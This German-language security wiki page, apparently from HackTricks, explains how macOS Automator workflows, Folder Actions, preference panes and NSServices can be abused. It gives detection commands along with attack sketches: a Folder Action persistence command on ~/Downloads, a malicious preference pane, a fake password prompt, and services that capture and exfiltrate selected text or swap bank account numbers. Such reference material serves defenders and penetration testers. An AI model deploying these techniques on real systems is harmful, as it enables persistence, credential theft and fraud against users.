# macOS Automator, Preference Panes & NSServices Missbrauch

{{#include ../../../banners/hacktricks-training.md}}

## Automator-Aktionen & Workflows

### Grundlegende Informationen

**Automator** ist macOS' visuelles Automatisierungswerkzeug. Es führt **workflows** (`.workflow` bundles) aus, die aus **actions** (`.action` bundles) bestehen. Automator treibt auch **Folder Actions**, **Quick Actions** und die Integration von **Shortcuts** an.

Automator actions sind **plugins**, die in die Automator-Laufzeit geladen werden, wenn ein workflow ausgeführt wird. Sie können:
- Beliebige Shell-Skripte ausführen
- Dateien und Daten verarbeiten
- Mit Anwendungen über AppleScript interagieren
- Zu komplexen Automatisierungen verketten

### Warum das wichtig ist

> [!WARNING]
> Automator workflows can be **social-engineered** into execution — they appear as simple document files. A `.workflow` bundle can contain embedded shell commands that execute when the workflow runs. Combined with Folder Actions, they provide **automatic persistence** that triggers on file events.

### Erkennung
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Ein `.workflow`-Bundle sieht für die meisten Benutzer wie eine normale Dokumentdatei aus:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions führen automatisch einen Workflow aus, wenn Dateien zu einem überwachten Ordner hinzugefügt werden:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions bleiben über Neustarts hinweg bestehen und werden still ausgeführt. Eine Folder Action auf `~/Downloads` bedeutet, dass **jede heruntergeladene Datei deinen Payload auslöst** — einschließlich Dateien aus Safari, Chrome, AirDrop und E-Mail-Anhängen.

---

## Einstellungsbereiche

### Grundlegende Informationen

Preference panes (`.prefPane` bundles) sind Plugins, die in **System Settings** (früher System Preferences) geladen werden. Sie stellen Konfigurations‑UI‑Panels für System‑ oder Drittanbieterfunktionen bereit.

### Warum das wichtig ist

- Preference panes werden im **System Settings process** ausgeführt, der möglicherweise **elevated TCC permissions** hat (accessibility, full disk access in bestimmten Kontexten)
- Drittanbieter-Preference panes werden in diesen vertrauenswürdigen Prozess geladen und **erben dessen Sicherheitskontext**
- Benutzer installieren Preference panes durch **Doppelklick** — einfaches Social Engineering
- Einmal installiert, **bestehen sie fort** und werden jedes Mal geladen, wenn System Settings dieses Panel öffnet

### Erkennung
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Angriff: Privilege Context Hijacking

Ein bösartiges Präferenz-Panel erbt den Sicherheitskontext von System Settings:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Angriff: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Angriff: UI Phishing

Ein Einstellungsfenster kann legitime System-UI-Elemente nachahmen, um **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Grundlegende Informationen

**NSServices** erlauben Anwendungen, anderen Apps Funktionalität über das **Services-Menü** (Rechtsklick → Services) bereitzustellen. Wenn ein Benutzer Text oder Daten auswählt und einen Service aufruft, werden die ausgewählten Daten zur Verarbeitung an den Service-Anbieter **gesendet**.

Services werden in der Anwendung`Info.plist` unter dem Schlüssel `NSServices` deklariert und beim pasteboard-Server (`pbs`) registriert.

### Warum das wichtig ist

- Services erhalten **anwendungsübergreifenden Datenfluss** — ausgewählter Text aus jeder Anwendung wird an den Service gesendet  
- Ein bösartiger Service kann Daten aus Passwort-Managern, E-Mail-Clients und Finanz-Apps abgreifen  
- Services können **veränderte Daten** an die aufrufende Anwendung zurückgeben (man-in-the-middle bei Auswahl-Operationen)  
- Service-Namen können so gestaltet werden, dass sie legitim erscheinen ("Format Text", "Encrypt Selection", "Share")

### Erkennung
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Angriff: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Angriff: Datenmanipulation (Man-in-the-Middle)

Ein Dienst kann **die zurückgegebenen Daten verändern**, während er vorgibt, eine legitime Funktion bereitzustellen:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Technikenübergreifende Angriffsketten

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Einstellungsbereich → TCC-Eskalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Diebstahl von Passwortmanagern
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referenzen

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
